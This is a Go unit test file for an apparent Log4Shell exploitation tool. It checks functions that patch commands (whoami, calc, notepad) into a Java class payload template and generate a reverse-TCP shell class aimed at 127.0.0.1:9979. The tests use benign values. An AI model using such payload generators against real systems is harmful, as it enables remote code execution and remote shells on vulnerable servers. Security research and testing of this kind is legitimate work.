package log4shell

import (
	"os"
	"testing"

	"github.com/davecgh/go-spew/spew"
	"github.com/stretchr/testify/require"
)

func TestGenerateExecute(t *testing.T) {
	template, err := os.ReadFile("testdata/template/Execute.class")
	require.NoError(t, err)
	spew.Dump(template)

	t.Run("common", func(t *testing.T) {
		class, err := GenerateExecute(template, "whoami", "Test")
		require.NoError(t, err)
		spew.Dump(class)
	})

	t.Run("default class", func(t *testing.T) {
		class, err := GenerateExecute(template, "${cmd}", "")
		require.NoError(t, err)
		spew.Dump(class)

		require.Equal(t, template, class)
	})

	t.Run("compare with Calc", func(t *testing.T) {
		class, err := GenerateExecute(template, "calc", "Calc")
		require.NoError(t, err)
		spew.Dump(class)

		expected, err := os.ReadFile("testdata/template/compare/Calc.class")
		require.NoError(t, err)
		require.Equal(t, expected, class)
	})

	t.Run("compare with Notepad", func(t *testing.T) {
		class, err := GenerateExecute(template, "notepad", "Notepad")
		require.NoError(t, err)
		spew.Dump(class)

		expected, err := os.ReadFile("testdata/template/compare/Notepad.class")
		require.NoError(t, err)
		require.Equal(t, expected, class)
	})

	t.Run("empty command", func(t *testing.T) {
		class, err := GenerateExecute(template, "", "Test")
		require.EqualError(t, err, "empty command")
		require.Zero(t, class)
	})
}

func TestGenerateReverseTCP(t *testing.T) {
	template, err := os.ReadFile("testdata/template/ReverseTCP.class")
	require.NoError(t, err)
	spew.Dump(template)

	t.Run("common", func(t *testing.T) {
		class, err := GenerateReverseTCP(template, "127.0.0.1", 9979, "", "Test")
		require.NoError(t, err)
		spew.Dump(class)
	})

	t.Run("default class", func(t *testing.T) {
		class, err := GenerateReverseTCP(template, "127.0.0.1", 9979, "test", "")
		require.NoError(t, err)
		spew.Dump(class)
	})

	t.Run("compare", func(t *testing.T) {
		class, err := GenerateReverseTCP(template, "127.0.0.1", 9979, "test", "ReTCP")
		require.NoError(t, err)
		spew.Dump(class)

		expected, err := os.ReadFile("testdata/template/compare/ReTCP.class")
		require.NoError(t, err)
		require.Equal(t, expected, class)
	})

	t.Run("empty host", func(t *testing.T) {
		class, err := GenerateReverseTCP(template, "", 1234, "", "")
		require.EqualError(t, err, "empty host")
		require.Zero(t, class)
	})

	t.Run("zero port", func(t *testing.T) {
		class, err := GenerateReverseTCP(template, "127.0.0.1", 0, "", "")
		require.EqualError(t, err, "zero port")
		require.Zero(t, class)
	})
}
